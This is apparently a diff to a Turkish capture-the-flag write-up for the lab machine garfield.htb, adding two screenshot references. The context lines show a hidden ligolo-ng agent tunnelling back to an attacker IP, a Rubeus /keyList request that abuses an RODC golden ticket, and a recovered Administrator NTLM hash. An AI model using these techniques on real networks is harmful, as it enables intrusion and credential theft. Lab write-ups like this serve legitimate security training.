@@ -273,6 +273,7 @@ upload /home/kali/ligolo-ng/agent.exe agent.exe
 ![agent](images/23-agent.exe.png)
 
 Start-Process -FilePath ".\agent.exe" -ArgumentList "-connect 10.10.17.90:11601 -ignore-cert" -WindowStyle Hidden
+![agent](images/23-agent.exe2.png)
 
 ligolo-ng >> session
 
@@ -438,6 +439,7 @@ krbtgt_8245'in AES256 anahtarıyla, Administrator (RID: 500) için sahte bir TGT
 
 Rubeus.exe asktgs /enctype:aes256 /keyList /service:krbtgt/garfield.htb /dc:DC01.garfield.htb /ticket:administrator_2026_09_26_01_29_56_Administrator_to_krbtgt@GARFIELD.HTB.kirbi /nowrap
 ![rubeus](images/36-rubeus3.png)
+![rubeus](images/37-rubeus4.png)
 
 RODC imzalı Golden Ticket'ı kullanarak, gerçek DC01'e /KeyList parametresiyle bir TGS talebi gönderiyoruz. Bu teknik; DC01'in bilete güvenip yanıt olarak kullanıcının gerçek anahtar meteryalini sızdırmasından faydalanıyor.
 Administrator'ın gerçek NTLM hash'i elde edildi -->  EE238F6DEBC752010428F20875B092D5
